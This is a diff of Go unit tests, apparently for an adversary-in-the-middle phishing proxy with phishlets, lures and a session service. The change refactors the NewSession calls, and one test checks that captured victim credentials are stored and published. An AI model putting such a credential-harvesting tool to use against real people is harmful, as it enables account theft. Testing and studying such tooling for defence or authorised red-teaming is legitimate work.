@@ -77,13 +77,7 @@ func newSessionService() (*aitm.SessionService, *stubSessionStore, *stubBus) {
 
 func TestSessionService_NewSession_CachesAndPersists(t *testing.T) {
 	svc, store, bus := newSessionService()
-	ctx := &aitm.ProxyContext{
-		ClientIP: "1.2.3.4",
-		Lure:     &aitm.Lure{ID: "lure-1"},
-		Phishlet: &aitm.Phishlet{Name: "test"},
-	}
-
-	sess, err := svc.NewSession(ctx)
+	sess, err := svc.NewSession("1.2.3.4", "", "lure-1", "test")
 	if err != nil {
 		t.Fatalf("NewSession: %v", err)
 	}
@@ -143,9 +137,7 @@ func TestSessionService_Get_NotFound(t *testing.T) {
 
 func TestSessionService_Complete_EvictsFromCache(t *testing.T) {
 	svc, store, bus := newSessionService()
-	ctx := &aitm.ProxyContext{Phishlet: &aitm.Phishlet{Name: "test"}}
-
-	sess, _ := svc.NewSession(ctx)
+	sess, _ := svc.NewSession("1.2.3.4", "", "lure-1", "test")
 
 	if err := svc.Complete(sess); err != nil {
 		t.Fatalf("Complete: %v", err)
@@ -171,9 +163,7 @@ func TestSessionService_Complete_EvictsFromCache(t *testing.T) {
 
 func TestSessionService_CaptureCredentials_PersistsAndPublishes(t *testing.T) {
 	svc, store, bus := newSessionService()
-	ctx := &aitm.ProxyContext{Phishlet: &aitm.Phishlet{Name: "test"}}
-
-	sess, _ := svc.NewSession(ctx)
+	sess, _ := svc.NewSession("1.2.3.4", "", "lure-1", "test")
 	sess.Username = "victim@example.com"
 	sess.Password = "hunter2"
 
@@ -195,9 +185,7 @@ func TestSessionService_CaptureCredentials_PersistsAndPublishes(t *testing.T) {
 
 func TestSessionService_Delete_EvictsFromCacheAndStore(t *testing.T) {
 	svc, store, _ := newSessionService()
-	ctx := &aitm.ProxyContext{Phishlet: &aitm.Phishlet{Name: "test"}}
-
-	sess, _ := svc.NewSession(ctx)
+	sess, _ := svc.NewSession("1.2.3.4", "", "lure-1", "test")
 
 	if err := svc.Delete(sess.ID); err != nil {
 		t.Fatalf("Delete: %v", err)
